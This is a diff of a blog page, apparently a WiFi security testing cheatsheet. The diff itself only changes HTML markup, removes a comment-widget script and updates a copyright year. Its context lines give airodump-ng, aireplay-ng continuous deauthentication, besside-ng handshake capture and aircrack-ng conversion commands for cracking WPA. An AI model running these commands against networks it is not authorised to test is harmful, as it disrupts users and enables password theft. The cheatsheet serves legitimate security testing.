@@ -93,10 +93,10 @@
 </ul>
 <hr>
 <h1 id="view-networks">View Networks</h1>
-<pre><code>airodump-ng wlan0
+<pre tabindex="0"><code>airodump-ng wlan0
 </code></pre><hr>
 <h1 id="capture-traffic">Capture traffic</h1>
-<pre><code>airodump-ng --bssid 04:A1:51:9F:98:BB --wps --write ISSO-WPA2 --channel 6 wlan0
+<pre tabindex="0"><code>airodump-ng --bssid 04:A1:51:9F:98:BB --wps --write ISSO-WPA2 --channel 6 wlan0
 </code></pre><p>where:</p>
 <pre>
 --bssid   - MAC of router
@@ -107,7 +107,7 @@ wlan0     - Wireless interface
 </pre>
 <hr>
 <h1 id="deauth---do-while-capturing">Deauth - Do while capturing</h1>
-<pre><code>aireplay-ng --deauth 0 -a 04:A1:51:9F:11:11 -c E0:AC:CB:DA:1B:1B wlan0
+<pre tabindex="0"><code>aireplay-ng --deauth 0 -a 04:A1:51:9F:11:11 -c E0:AC:CB:DA:1B:1B wlan0
 </code></pre><p>where:</p>
 <pre>
 0           - Continuously send deauth packets
@@ -119,7 +119,7 @@ wlan0       - Interface
 </pre>
 <hr>
 <h1 id="automating-de-auth-attackhandshake-grab">Automating de-auth attack/handshake grab</h1>
-<pre><code>besside-ng -W -c 6 -b 00:00:11:22:33:44 wlan0
+<pre tabindex="0"><code>besside-ng -W -c 6 -b 00:00:11:22:33:44 wlan0
 </code></pre><p>where:</p>
 <pre>
 -W    - WPA networks only
@@ -134,7 +134,7 @@ wlan0 - interface
 </ul>
 <hr>
 <h1 id="seperate-out-individual-caps-from-besside-ng-output">Seperate out individual caps from besside-ng output</h1>
-<pre><code>pyrit -r wpa.cap -o mytargetnetwork.cap -e mytarget strip
+<pre tabindex="0"><code>pyrit -r wpa.cap -o mytargetnetwork.cap -e mytarget strip
 </code></pre><p>where:</p>
 <pre>
 -r - Input file to look at created by besside-ng
@@ -143,7 +143,7 @@ wlan0 - interface
 </pre>
 <hr>
 <h1 id="convert-cap-with-handshake-to-hccap">Convert .cap with handshake to .hccap</h1>
-<pre><code>aircrack-ng -J network network.cap
+<pre tabindex="0"><code>aircrack-ng -J network network.cap
 </code></pre><ul>
 <li>Aircrack already adds .hccap extension to file</li>
 </ul>
@@ -158,21 +158,6 @@ wlan0 - interface
       </p>
 
       
-<div id="disqus_thread"></div>
-<script type="text/javascript">
-  var disqus_config = function () {
-    this.page.url = "https:\/\/danthesalmon.com";
-    this.page.identifier = "\/wifi-security-testing-cheatsheet\/";
-  };
-
-  (function() { 
-    var d = document, s = d.createElement('script');
-    s.src = "https://salmonroll.disqus.com/embed.js";
-    s.setAttribute('data-timestamp', +new Date());
-    (d.head || d.body).appendChild(s);
-  })();
-</script>
-
 
     </div>
   </div>
@@ -188,7 +173,7 @@ wlan0 - interface
 </nav>
 
           <small>
-            Copyright &#169; 2020<br>
+            Copyright &#169; 2022<br>
             Powered by <a href="http://gohugo.io/" target="_blank">Hugo</a> &amp; <a href="https://github.com/sa7mon/hugo-theme-pixyll" target="_blank">Pixyll</a>
           </small>
         </div>
